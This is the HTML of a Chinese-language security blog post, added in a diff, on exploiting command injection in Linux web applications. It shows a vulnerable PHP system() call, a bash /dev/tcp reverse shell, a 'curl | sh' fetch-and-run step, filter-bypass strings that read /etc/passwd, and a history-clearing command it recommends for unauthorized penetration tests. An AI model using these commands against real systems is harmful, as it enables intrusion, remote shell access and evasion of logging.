@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width">
+	<title>命令注入一些利用技巧 &ndash; # alert`D0n9` ｜ 输攻墨守</title>
+	<link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/nav.css">
+    
+    
+    
+    
+    
+	<link rel="stylesheet" href="/css/themes/light.css">
+</head>
+<body>
+	<input class="show-hide-menu-input" style="display:none;" autocomplete="off" type="checkbox" id="toggle-1">
+	<label class="overlay" for="toggle-1"></label>
+	<div class="main">
+		<header class="header">
+			<div class="header-content">
+				<div class="title">
+					<a href="http://localhost:1313/"># alert`D0n9` ｜ 输攻墨守</a>
+				</div>
+				<div>
+					<div class="header-right">
+						<label id="show-hide-menu-label" class="clickable-header-label" for="toggle-1">
+							<img class="color-adapting-image" width="30" src="/images/hamburger.svg" alt="menu button">
+						</label>
+					</div>
+					<div class="dont-show">
+						<p>
+							Links:
+						</p>
+					</div>
+					<ul class="links">
+						<li><a href="/">Home</a></li>
+						<li><a href="/posts/">Posts</a></li>
+						<li><a href="/about-me/">About Me</a></li>
+						<li><a href="/tags/">Tags</a></li>
+					</ul>
+				</div>
+			</div>
+		</header>
+		<main class="body">
+			<div class="body-content">
+  <header class="title-header">
+    <h1>命令注入一些利用技巧</h1>
+    <div class="title-header-date">
+        <time>Wednesday, July 5, 2017</time>
+    </div>
+    
+  </header>
+  <h4 id="前言">前言<aside class="heading-anchor"><a href="#前言" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h4>
+<p>如果在做渗透的时候如果能发现一处命令注入，肯定会特别开心，这个时候就离进内网不远了，但往往会遇到各种限制，本文记录一些利用技巧。</p>
+<p>首先要先区分命令注入和代码执行的区别，这是两种不同的概念，很容易搞混。</p>
+<p>可以看这篇文章 <a href="https://landgrey.me/judge-cmd_execute-or-code_execute/">命令注入与代码执行的判断</a></p>
+<p>命令注入我遇到绝大部分环境都是 Linux，Win 也有但是很少很少（可能是还是做渗透少）所以本文着重分享 Linux 下的一些姿势</p>
+<h4 id="判断">判断<aside class="heading-anchor"><a href="#判断" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h4>
+<p>命令注入大致可分为有回显和没回显两种，检测判断方法可以参照@RickGray 所写的 <a href="http://blog.knownsec.com/2016/06/how-to-scan-and-check-vulnerabilities/">漏洞检测的那些事儿</a> 或者用 sleep 判断响应时间，有点像 SQL injection 时间盲注。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171639498.jpg" alt=""></p>
+<h4 id="发现">发现<aside class="heading-anchor"><a href="#发现" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h4>
+<p>根据判断方式一般准确度很高，可能存在漏洞的位置可能也是千奇百怪，如吴师傅曾发现过在发短信位置的命令注入，猜测这个位置有调用 sh ，或者无脑 fuzz，在可控的位置都打上 Payload 往往也会有奇效，运气成分很大。</p>
+<p>如果是拼接，比如</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$vul</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vul&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="s2">&#34;grep </span><span class="si">{</span><span class="nv">$vul</span><span class="si">}</span><span class="s2"> /etc/hosts -C 10&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;grep </span><span class="si">{</span><span class="nv">$vul</span><span class="si">}</span><span class="s2"> /etc/hosts -C 10&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>这里直接拼接进入 system 函数，存在命令注入，但由于前面有 <strong>grep</strong>命令，直接提交想执行的命令是行不通的，这时要利用一些方法
+比如管道符 ** | **，
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171639798.jpg" alt=""></p>
+<p>或者换行 ** %0a **
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171639589.jpg" alt=""></p>
+<h4 id="利用">利用<aside class="heading-anchor"><a href="#利用" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h4>
+<p>有回显自然方便，可以直接当做一个 &ldquo;Shell接口&rdquo;，不过容易遇到编码的坑也没有 tty 那样方便，这个时候就要考虑反弹 Shell 出来，反弹 Shell 是让目标主机主动连接你，所以需要有一个外网 IP 才行，常用的一条反弹命令，更多 文· <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.0.0.1/2333 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><p>然后用 Python 得到一个 tty Shell，更多 文· <a href="https://netsec.ws/?p=337">Spawning a TTY Shell</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>这样就得到一个 tty Shell，更方便做一些操作</p>
+<p>更多情况我们遇到的命令注入可能都是不回显的，没有回显就不能从执行命令页面的返回内容来判断是否存在漏洞，然后就要用到一个更高级的判断方式，利用外部 http 访问记录或者 dns 记录来判断，我更喜欢把这种方式叫做 Cloudeye，想念毕鸽子一秒钟。0x02 有介绍。</p>
+<p>乌云上 lijiejie 发过几个隐式命令注入估计也是用的这种方法做的判断，黑盒扫描，所有能控制的位置都打一发 payload</p>
+<p>之前 zone 里有帖子讨论过不回显的命令注入怎么带数据，各种集思广益脑洞很大的方法，红老师这篇文章有介绍是比较全了，文·<a href="https://www.zybuluo.com/RedFree/note/618099">Tankeye使用宝典</a></p>
+<p>有时候命令注入可能会有过滤某些字符或者各种编码坑，可以使用管道符 &ldquo;|&rdquo;</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171640402.jpg" alt=""></p>
+<p>可以这样，在vps 开 http，index.html 内容写** bash -i &gt;&amp; /dev/tcp/10.0.0.1/2333 0&gt;&amp;1
+**</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl 10.0.0.1 <span class="p">|</span> sh
+</span></span></code></pre></div><p>或者用重定向 &ldquo;&gt;&rdquo; 写文件再执行也是一样，有时候会遇到反弹不出来，可以选择反弹到80或者443，或者换其他反弹 Shell 方式。</p>
+<p>如果你在做未授权的渗透测试在反弹 Shell 后最好执行一下下面的命令，防止被记录到history</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG<span class="p">;</span> <span class="nb">export</span> <span class="nv">HISTFILE</span><span class="o">=</span>/dev/null<span class="p">;</span><span class="nb">export</span> <span class="nv">HISTSIZE</span><span class="o">=</span>0<span class="p">;</span> <span class="nb">export</span> <span class="nv">HISTFILESIZE</span><span class="o">=</span><span class="m">0</span>
+</span></span></code></pre></div><h4 id="绕过">绕过<aside class="heading-anchor"><a href="#绕过" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h4>
+<p>得益于 bash 的灵活性，命令注入绕 waf 还是很简单的。</p>
+<p>@zTrix 在16年阿里安全峰会有分享一些姿势 PPT · <a href="https://yqfile.alicdn.com/5241880c788b5db39608ed02fe89c4b9.pdf?spm=5176.100239.blogcont58395.37.2TD0Kt&amp;file=5241880c788b5db39608ed02fe89c4b9.pdf">论WAF的新玩法</a></p>
+<p>比如</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171640799.jpg" alt=""></p>
+<p>更激进一点， 这里利用上顿号，或者使用**$()**的方式</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171640719.jpg" alt=""></p>
+<p>或者用16进制，理论上其他能 decode 的编码应该都可以</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171641026.jpg" alt=""></p>
+<p>或者用变量</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171641271.jpg" alt=""></p>
+<p>如果空格被过滤，@猪猪侠 的小秘圈 &lsquo;安全技术&rsquo; 中学到的姿势</p>
+<p>@Mickey 老师的分享，<strong>$IFS</strong>的方法都很熟悉了，**{,,}**这个方法真的眼前一亮</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171641101.jpg" alt=""></p>
+<p>拆分环境变量</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${SHELLOPTS:3:1}at${IFS}${PATH:0:1}${SHELLOPTS:4:1}t${SHELLOPTS:3:1}${HOME:0:1}p${SHELLOPTS:2:1}sswd
+</span></span></code></pre></div><p>读文件绕过空格用 <strong>&lt;&gt;</strong> 重定向符和 <strong>${IFS}</strong></p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171642260.jpg" alt="">
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/07/202402171642862.jpg" alt=""></p>
+<p>更多技巧等待发掘</p>
+
+  
+  
+  <div class="post-tags">
+    <p>Tags: 
+    
+      <a href="/tags/rce">RCE</a>
+    
+      <a href="/tags/web%E5%AE%89%E5%85%A8">Web安全</a>
+    
+    </p>
+  </div>
+  
+
+			</div>
+		</main>
+	</div>
+	<hr class="dont-show">
+	<footer class="footer">
+		<p>Powered by <a href="https://gohugo.io/">Hugo</a> &amp; <a href="https://github.com/stevenengler/no-js-hugo-theme">no-js-hugo-theme</a></p>
+	</footer>
+</body>
+</html>
